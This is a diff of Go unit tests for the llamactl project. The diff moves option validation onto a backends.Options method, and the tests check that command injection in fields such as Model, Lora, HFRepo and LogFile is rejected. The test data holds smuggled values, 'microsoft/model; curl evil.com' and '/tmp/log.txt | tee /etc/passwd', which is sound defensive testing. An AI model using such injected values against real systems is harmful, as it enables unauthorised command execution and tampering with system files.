@@ -2,9 +2,6 @@ package validation_test
 
 import (
 	"llamactl/pkg/backends"
-	"llamactl/pkg/backends/llamacpp"
-	"llamactl/pkg/instance"
-	"llamactl/pkg/testutil"
 	"llamactl/pkg/validation"
 	"strings"
 	"testing"
@@ -58,12 +55,10 @@ func TestValidateInstanceName(t *testing.T) {
 }
 
 func TestValidateInstanceOptions_NilOptions(t *testing.T) {
-	err := validation.ValidateInstanceOptions(nil)
+	var opts backends.Options
+	err := opts.ValidateInstanceOptions()
 	if err == nil {
 		t.Error("Expected error for nil options")
-	}
-	if !strings.Contains(err.Error(), "options cannot be nil") {
-		t.Errorf("Expected 'options cannot be nil' error, got: %v", err)
 	}
 }
 
@@ -83,14 +78,14 @@ func TestValidateInstanceOptions_PortValidation(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			options := &instance.Options{
+			options := backends.Options{
 				BackendType: backends.BackendTypeLlamaCpp,
-				LlamaServerOptions: &llamacpp.LlamaServerOptions{
+				LlamaServerOptions: &backends.LlamaServerOptions{
 					Port: tt.port,
 				},
 			}
 
-			err := validation.ValidateInstanceOptions(options)
+			err := options.ValidateInstanceOptions()
 			if (err != nil) != tt.wantErr {
 				t.Errorf("ValidateInstanceOptions(port=%d) error = %v, wantErr %v", tt.port, err, tt.wantErr)
 			}
@@ -137,14 +132,14 @@ func TestValidateInstanceOptions_StringInjection(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			// Test with Model field (string field)
-			options := &instance.Options{
+			options := backends.Options{
 				BackendType: backends.BackendTypeLlamaCpp,
-				LlamaServerOptions: &llamacpp.LlamaServerOptions{
+				LlamaServerOptions: &backends.LlamaServerOptions{
 					Model: tt.value,
 				},
 			}
 
-			err := validation.ValidateInstanceOptions(options)
+			err := options.ValidateInstanceOptions()
 			if (err != nil) != tt.wantErr {
 				t.Errorf("ValidateInstanceOptions(model=%q) error = %v, wantErr %v", tt.value, err, tt.wantErr)
 			}
@@ -175,14 +170,14 @@ func TestValidateInstanceOptions_ArrayInjection(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			// Test with Lora field (array field)
-			options := &instance.Options{
+			options := backends.Options{
 				BackendType: backends.BackendTypeLlamaCpp,
-				LlamaServerOptions: &llamacpp.LlamaServerOptions{
+				LlamaServerOptions: &backends.LlamaServerOptions{
 					Lora: tt.array,
 				},
 			}
 
-			err := validation.ValidateInstanceOptions(options)
+			err := options.ValidateInstanceOptions()
 			if (err != nil) != tt.wantErr {
 				t.Errorf("ValidateInstanceOptions(lora=%v) error = %v, wantErr %v", tt.array, err, tt.wantErr)
 			}
@@ -194,14 +189,14 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 	// Test that injection in any field is caught
 	tests := []struct {
 		name    string
-		options *instance.Options
+		options backends.Options
 		wantErr bool
 	}{
 		{
 			name: "injection in model field",
-			options: &instance.Options{
+			options: backends.Options{
 				BackendType: backends.BackendTypeLlamaCpp,
-				LlamaServerOptions: &llamacpp.LlamaServerOptions{
+				LlamaServerOptions: &backends.LlamaServerOptions{
 					Model:  "safe.gguf",
 					HFRepo: "microsoft/model; curl evil.com",
 				},
@@ -210,9 +205,9 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 		},
 		{
 			name: "injection in log file",
-			options: &instance.Options{
+			options: backends.Options{
 				BackendType: backends.BackendTypeLlamaCpp,
-				LlamaServerOptions: &llamacpp.LlamaServerOptions{
+				LlamaServerOptions: &backends.LlamaServerOptions{
 					Model:   "safe.gguf",
 					LogFile: "/tmp/log.txt | tee /etc/passwd",
 				},
@@ -221,9 +216,9 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 		},
 		{
 			name: "all safe fields",
-			options: &instance.Options{
+			options: backends.Options{
 				BackendType: backends.BackendTypeLlamaCpp,
-				LlamaServerOptions: &llamacpp.LlamaServerOptions{
+				LlamaServerOptions: &backends.LlamaServerOptions{
 					Model:   "/path/to/model.gguf",
 					HFRepo:  "microsoft/DialoGPT-medium",
 					LogFile: "/tmp/llama.log",
@@ -237,7 +232,7 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			err := validation.ValidateInstanceOptions(tt.options)
+			err := tt.options.ValidateInstanceOptions()
 			if (err != nil) != tt.wantErr {
 				t.Errorf("ValidateInstanceOptions() error = %v, wantErr %v", err, tt.wantErr)
 			}
@@ -247,12 +242,9 @@ func TestValidateInstanceOptions_MultipleFieldInjection(t *testing.T) {
 
 func TestValidateInstanceOptions_NonStringFields(t *testing.T) {
 	// Test that non-string fields don't interfere with validation
-	options := &instance.Options{
-		AutoRestart:  testutil.BoolPtr(true),
-		MaxRestarts:  testutil.IntPtr(5),
-		RestartDelay: testutil.IntPtr(10),
-		BackendType:  backends.BackendTypeLlamaCpp,
-		LlamaServerOptions: &llamacpp.LlamaServerOptions{
+	options := backends.Options{
+		BackendType: backends.BackendTypeLlamaCpp,
+		LlamaServerOptions: &backends.LlamaServerOptions{
 			Port:        8080,
 			GPULayers:   32,
 			CtxSize:     4096,
@@ -264,7 +256,7 @@ func TestValidateInstanceOptions_NonStringFields(t *testing.T) {
 		},
 	}
 
-	err := validation.ValidateInstanceOptions(options)
+	err := options.ValidateInstanceOptions()
 	if err != nil {
 		t.Errorf("ValidateInstanceOptions with non-string fields should not error, got: %v", err)
 	}
